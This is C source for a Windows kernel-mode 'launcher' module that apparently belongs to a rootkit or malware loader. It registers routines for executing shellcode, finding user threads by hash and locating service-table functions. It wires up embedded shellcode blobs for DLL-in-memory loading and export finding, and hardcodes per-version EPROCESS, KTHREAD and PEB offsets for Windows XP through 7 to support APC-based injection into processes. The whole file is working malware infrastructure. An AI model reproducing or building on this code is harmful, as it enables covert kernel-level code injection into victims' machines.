#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../mod_shared/headers.h"

#include "mod_launcher.c"
#include "mod_launcherApi.c"

NTSTATUS mod_launcherEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    pmod_header_t pModHeader = (pmod_header_t)modBase;
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_launcher_block_t pLauncherBlock;

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pLauncherBlock, sizeof(mod_launcher_block_t), NonPagedPool);
    pGlobalBlock->pLauncherBlock = pLauncherBlock;
    pLauncherBlock->pModBase = (uint8_t*)modBase;

#ifndef _SOLID_DRIVER
    
#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value((PUINT8)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((PUINT8)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_find_func_in_service_table);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_find_user_thread_by_hash);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_add_zfile_clone_for_process);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_load_file);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_load_config);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_save_config);
//     DECLARE_GLOBAL_FUNC(pLauncherBlock, apc_kernel_routine);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_define_overlord_zfile);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_create_process_notifier);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_process_modules);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_execute_shellcode);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_autostart_modules);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_process_config_entries);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_process_zfile);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_stage1_init);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_shutdown_routine);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_process_bundle);
    DECLARE_GLOBAL_FUNC(pLauncherBlock, launcher_overlord_request);

#ifdef _WIN64
    pLauncherBlock->scOverlord64 = (uint8_t*)sc_overlord_x64;
    pLauncherBlock->scDllMem64 = (uint8_t*)sc_dll_mem_x64;
    pLauncherBlock->scTransitLauncher64 = (uint8_t*)sc_transit_launcher_x64 + MOD_BASE;
    pLauncherBlock->scNtDLLFinder64 = (uint8_t*)sc_ntdll_finder_x64;
    pLauncherBlock->scExportFinder64 = (uint8_t*)sc_export_finder_x64;
    pLauncherBlock->scOverlordSize = sizeof(sc_overlord_x64);
#else
    pLauncherBlock->scOverlordSize = sizeof(sc_overlord_x32);
#endif // _WIN64
    pLauncherBlock->scOverlord32 = (uint8_t*)sc_overlord_x32 + MOD_BASE;
    pLauncherBlock->scDllMem32 = (uint8_t*)sc_dll_mem_x32 + MOD_BASE;
    pLauncherBlock->scTransitLauncher32 = (uint8_t*)sc_transit_launcher_x32 + MOD_BASE;
    pLauncherBlock->scNtDLLFinder32 = (uint8_t*)sc_ntdll_finder_x32 + MOD_BASE;
    pLauncherBlock->scExportFinder32 = (uint8_t*)sc_export_finder_x32 + MOD_BASE;

    if (pGlobalBlock->osMajorVersion == 5) {
#ifndef _WIN64
        if (pGlobalBlock->osMinorVersion == 1) { // Windows XP (SP0, SP1, SP2, SP3)
//          pLauncherBlock->dwPID                       = 0x084;    // EPROCESS.UniqueProcessId
            pLauncherBlock->dwImageFileName             = 0x174;    // EPROCESS.ImageFileName
            pLauncherBlock->dwActiveProcessLinks        = 0x088;    // EPROCESS.ActiveProcessLinks
            pLauncherBlock->dwThreadListHead            = 0x190;    // EPROCESS.ThreadListHead
            pLauncherBlock->dwThreadListEntry           = 0x22c;    // ETHREAD.ThreadListEntry
            pLauncherBlock->dwThreadState               = 0x02d;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x228;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x05b;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x1b0;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x00C;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x014;    // PEB_LDR_DATA.InMemoryOrderModuleList - OK
            pLauncherBlock->dwDllBase                   = 0x010;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks
            pLauncherBlock->dwFullDllName               = 0x024;    // LDR_DATA_TABLE_ENTRY.FullDllName
            pLauncherBlock->dwApcQueueable              = 0x034;    // KPROCESS.ApcState
            pLauncherBlock->dwAlertable                 = 0x164;    // KTHREAD.Alertable;
            pLauncherBlock->dbAlertableMask             = 0x001;    //
        }
        else
#endif
            if (pGlobalBlock->osMinorVersion == 2) { // Win 2003 Server, Windows XP x64
#ifdef _WIN64
//          pLauncherBlock->dwPID                       = 0x0d8;    // EPROCESS.UniqueProcessId - OK
            pLauncherBlock->dwImageFileName             = 0x268;    // EPROCESS.ImageFileName - OK
            pLauncherBlock->dwActiveProcessLinks        = 0x0e0;    // EPROCESS.ActiveProcessLinks - OK
            pLauncherBlock->dwThreadListHead            = 0x290;    // EPROCESS.ThreadListHead - OK
            pLauncherBlock->dwThreadListEntry           = 0x3d0;    // ETHREAD.ThreadListEntry - OK
            pLauncherBlock->dwThreadState               = 0x154;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x3c8;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x092;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x2c0;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x018;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x020;    // PEB_LDR_DATA.InMemoryOrderModuleList - OK
            pLauncherBlock->dwDllBase                   = 0x020;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks - OK
            pLauncherBlock->dwFullDllName               = 0x048;    // LDR_DATA_TABLE_ENTRY.FullDllName - OK
            pLauncherBlock->dwApcQueueable              = 0x048;    // KTHREAD.ApcState
            pLauncherBlock->dwAlertable                 = 0x090;    // KTHREAD.Alertable;
            pLauncherBlock->dbAlertableMask             = 0x001;    //
#else
//          pLauncherBlock->dwPID                       = 0x094;    // EPROCESS.UniqueProcessId - OK
            pLauncherBlock->dwImageFileName             = 0x164;    // EPROCESS.ImageFileName
            pLauncherBlock->dwActiveProcessLinks        = 0x098;    // EPROCESS.ActiveProcessLinks
            pLauncherBlock->dwThreadListHead            = 0x180;    // EPROCESS.ThreadListHead
            pLauncherBlock->dwThreadListEntry           = 0x224;    // ETHREAD.ThreadListEntry
            pLauncherBlock->dwThreadState               = 0x04c;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x220;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x05a;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x1a0;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x00C;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x014;    // PEB_LDR_DATA.InMemoryOrderModuleList - OK
            pLauncherBlock->dwDllBase                   = 0x010;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks
            pLauncherBlock->dwFullDllName               = 0x024;    // LDR_DATA_TABLE_ENTRY.FullDllName
            pLauncherBlock->dwApcQueueable              = 0x034;    // KPROCESS.ApcState
            pLauncherBlock->dwAlertable                 = 0x058;    // KTHREAD.Alertable;
            pLauncherBlock->dbAlertableMask             = 0x001;    //
#endif
        }
    }
    else if (pGlobalBlock->osMajorVersion == 6) {
        if (pGlobalBlock->osMinorVersion == 0) { // Vista, Windows Server 2008 (SP0)
#ifdef _WIN64
//            pLauncherBlock->dwPID                      = 0x0e0;    // EPROCESS.UniqueProcessId
            pLauncherBlock->dwImageFileName             = 0x238;    // EPROCESS.ImageFileName
            pLauncherBlock->dwActiveProcessLinks        = 0x0e8;    // EPROCESS.ActiveProcessLinks
            pLauncherBlock->dwThreadListHead            = 0x260;    // EPROCESS.ThreadListHead
            pLauncherBlock->dwThreadListEntry           = 0x3f0;    // ETHREAD.ThreadListEntry
            pLauncherBlock->dwThreadState               = 0x154;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x3e0;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x094;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x290;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x018;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x020;    // PEB_LDR_DATA.InMemoryOrderModuleList
            pLauncherBlock->dwDllBase                   = 0x020;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks
            pLauncherBlock->dwFullDllName               = 0x048;    // LDR_DATA_TABLE_ENTRY.FullDllName
            pLauncherBlock->dwApcQueueable              = 0x048;    // KTHREAD.ApcState
            pLauncherBlock->dwAlertable                 = 0x0f4;    // KTHREAD.ApcQueueable     : Pos 5, 1 Bit;
            pLauncherBlock->dbAlertableMask             = 0x040;    //
#else
//          pLauncherBlock->dwPID                       = 0x09c;    // EPROCESS.UniqueProcessId
            pLauncherBlock->dwImageFileName             = 0x14c;    // EPROCESS.ImageFileName
            pLauncherBlock->dwActiveProcessLinks        = 0x0a0;    // EPROCESS.ActiveProcessLinks
            pLauncherBlock->dwThreadListHead            = 0x168;    // EPROCESS.ThreadListHead
            pLauncherBlock->dwThreadListEntry           = 0x248;    // ETHREAD.ThreadListEntry
            pLauncherBlock->dwThreadState               = 0x05c;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x240;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x06c;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x188;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x00C;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x014;    // PEB_LDR_DATA.InMemoryOrderModuleList
            pLauncherBlock->dwDllBase                   = 0x010;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks
            pLauncherBlock->dwFullDllName               = 0x024;    // LDR_DATA_TABLE_ENTRY.FullDllName
            pLauncherBlock->dwApcQueueable              = 0x038;    // KTHREAD.ApcState
            pLauncherBlock->dwAlertable                 = 0x0b0;    // KTHREAD.ApcQueueable     : Pos 6, 1 Bit;
            pLauncherBlock->dbAlertableMask             = 0x040;    //
#endif
        }
        else if (pGlobalBlock->osMinorVersion == 1) { // Windows 7, Windows Server 2008 R2 (x86)
#ifdef _WIN64
//              pLauncherBlock->dwPID                       = 0x180;    // EPROCESS.UniqueProcessId
            pLauncherBlock->dwImageFileName             = 0x2e0;    // EPROCESS.ImageFileName
            pLauncherBlock->dwActiveProcessLinks        = 0x188;    // EPROCESS.ActiveProcessLinks
            pLauncherBlock->dwThreadListHead            = 0x308;    // EPROCESS.ThreadListHead
            pLauncherBlock->dwThreadListEntry           = 0x420;    // ETHREAD.ThreadListEntry
            pLauncherBlock->dwThreadState               = 0x164;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x410;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x26b;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x338;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x018;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x020;    // PEB_LDR_DATA.InMemoryOrderModuleList
            pLauncherBlock->dwDllBase                   = 0x020;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks
            pLauncherBlock->dwFullDllName               = 0x048;    // LDR_DATA_TABLE_ENTRY.FullDllName
            pLauncherBlock->dwApcQueueable              = 0x050;    // KTHREAD.ApcState
            pLauncherBlock->dwAlertable                 = 0x100;    // KTHREAD.ApcQueueable     : Pos 5, 1 Bit;
            pLauncherBlock->dbAlertableMask             = 0x020;    //
#else
//              pLauncherBlock->dwPID                       = 0x0b4;    // EPROCESS.UniqueProcessId
            pLauncherBlock->dwImageFileName             = 0x16c;    // EPROCESS.ImageFileName
            pLauncherBlock->dwActiveProcessLinks        = 0x0b8;    // EPROCESS.ActiveProcessLinks
            pLauncherBlock->dwThreadListHead            = 0x188;    // EPROCESS.ThreadListHead
            pLauncherBlock->dwThreadListEntry           = 0x268;    // ETHREAD.ThreadListEntry
            pLauncherBlock->dwThreadState               = 0x068;    // KTHREAD.State
            pLauncherBlock->dwWin32StartAddress         = 0x260;    // ETHREAD.Win32StartAddress
            pLauncherBlock->dwWaitReason                = 0x187;    // KTHREAD.WaitReason
            pLauncherBlock->dwPeb                       = 0x1a8;    // EPROCESS.Peb
            pLauncherBlock->dwLdr                       = 0x00C;    // PEB.Ldr
            pLauncherBlock->dwInMemoryOrderModuleList   = 0x014;    // PEB_LDR_DATA.InMemoryOrderModuleList
            pLauncherBlock->dwDllBase                   = 0x010;    // LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks
            pLauncherBlock->dwFullDllName               = 0x024;    // LDR_DATA_TABLE_ENTRY.FullDllName
            pLauncherBlock->dwApcQueueable              = 0x040;    // KTHREAD.ApcState
            pLauncherBlock->dwAlertable                 = 0x03c;    // KTHREAD.ApcQueueable     : Pos 5, 1 Bit;
            pLauncherBlock->dbAlertableMask             = 0x020;    //
#endif
        }
    }

    {
        uint8_t* ptr;
        uint32_t i =0;
        pLauncherBlock->excludeProcesses[i++] = EXCLUDE_PROC1;
        pLauncherBlock->excludeProcesses[i++] = EXCLUDE_PROC2;
        pLauncherBlock->excludeProcesses[i++] = EXCLUDE_PROC3;
        pLauncherBlock->excludeProcesses[i++] = EXCLUDE_PROC4;
//        pLauncherBlock->excludeProcesses[i++] = EXCLUDE_PROC5;
//        pLauncherBlock->excludeProcesses[3] = EXCLUDE_PROC6;
    }

    pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)&pLauncherBlock->baseListHead);
    pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)&pLauncherBlock->runningListHead);

#ifdef _WIN64
    pLauncherBlock->slRunningList = 0;
#else
    pCommonBlock->fnKeInitializeSpinLock(&pLauncherBlock->slRunningList);
#endif

#ifdef _WIN64
    pLauncherBlock->slBaseList = 0;
#else
    pCommonBlock->fnKeInitializeSpinLock(&pLauncherBlock->slBaseList);
#endif

    // выделяех хеш таблицу для 7 файлов.
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pLauncherBlock->pFilesHashTable, 7 * sizeof(file_hash_entry_t), NonPagedPool);

    return STATUS_SUCCESS;
}
